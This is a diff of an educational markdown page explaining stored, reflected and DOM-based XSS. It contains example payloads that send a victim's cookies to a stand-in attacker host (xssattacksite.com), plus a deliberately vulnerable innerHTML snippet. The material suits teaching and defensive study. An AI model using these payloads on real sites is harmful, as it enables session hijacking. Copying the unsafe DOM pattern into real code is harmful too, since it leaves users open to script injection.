@@ -8,47 +8,49 @@ Cross-Site Scripting (XSS) attacks are a type of **injection**, in which **malic
 
 ### Types
 
-#### **Stored XSS**&#x20;
+#### **Stored XSS**
 
 {% hint style="info" %}
 The injected script is permanently stored on the target servers, such as in a database, in a **message** forum, visitor log, **comment** **field**, etc. The victim then retrieves the malicious script from the server when it requests the stored information.
 {% endhint %}
 
-#### **Reflected XSS**&#x20;
+#### **Reflected XSS**
 
 {% hint style="info" %}
-Reflected attacks are those where the injected script is **reflected** off the web server, such as in an **error message**, **search result**, or any other response that includes some or all of the input sent to the server as part of the request.&#x20;
+Reflected attacks are those where the injected script is **reflected** off the web server, such as in an **error message**, **search result**, or any other response that includes some or all of the input sent to the server as part of the request.
 {% endhint %}
 
-Let’s say a web page has a search box, which displays the search text alongside the search results as follows :
+**Explanations**
 
-`Your search results for “searchtext”:`
+Let’s say a web page has a search box, which displays the search text alongside the search results as follows : **`Your search results for “searchtext”:`**
 
-The web page also uses the **HTTP GET request method** to embed the user’s input data to the query string of the URL as follows:&#x20;
+The web page also uses the **HTTP GET request method** to embed the user’s input data to the query string of the URL as follows: `https://example.com/action.php?query=searchtext`
 
-`https://example.com/action.php?query=searchtext`
+If the search box is **susceptible to a non-persistent XSS attack**, a cybercriminal can send a malicious link to an unsuspecting user and exploit the vulnerability. **This is how the script-injected link could look like:**
 
-If the search box is susceptible to a non-persistent XSS attack, a cybercriminal can send a malicious link to an unsuspecting user and exploit the vulnerability.&#x20;
+```
+https://example.com/action.php?query=<script>document.location=’https://xssattacksite.com/log.php?c=’ + encodeURIComponent(document.cookie)</script>
+```
 
-This is how the script-injected link could look like:
-
-`https://example.com/action.php?query=<script>document.location=’https://xssattacksite.com/log.php?c=’ + encodeURIComponent(document.cookie)</script>`
-
-#### **DOM XSS**&#x20;
+#### **DOM XSS**
 
 {% hint style="info" %}
-DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.
+DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the **attack payload is executed as a result of modifying the DOM “environment”** in the victim’s browser used by the original client side script, so that the client side code runs in an “**unexpected**” manner.&#x20;
+
+That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.
 {% endhint %}
 
 Let’s take the following example of a web page that utilizes JavaScript to manipulate a DOM element:
 
-`let searchText = document.getElementById(‘searchText’).value;`\
-`let resultsData = document.getElementById(‘resultsData’);`\
-`resultsData.innerHTML = ‘Your search results for: ‘ + searchText;`
+```javascript
+let searchText = document.getElementById(‘searchText’).value;
+let resultsData = document.getElementById(‘resultsData’);
+resultsData.innerHTML = ‘Your search results for: ‘ + searchText;
+```
 
-As you can see on the code snippet above, the value from a user input field is grabbed and appended to an element within the web page’s HTML. If an attacker can control this value, they can craft a devious value that forces their own code to be executed.
+As you can see on the code snippet above, the **value** from a **user input field** is grabbed and **appended to an element within the web page’s HTML**. If an attacker can control this value, they can craft a devious value that forces their own code to be executed.
 
-Here is an example **** :
+Here is an example :
 
 `Your search results for: “<script>document.location=’https://xssattacksite.com/log.php?c=’ + document.cookie</script>”`
 
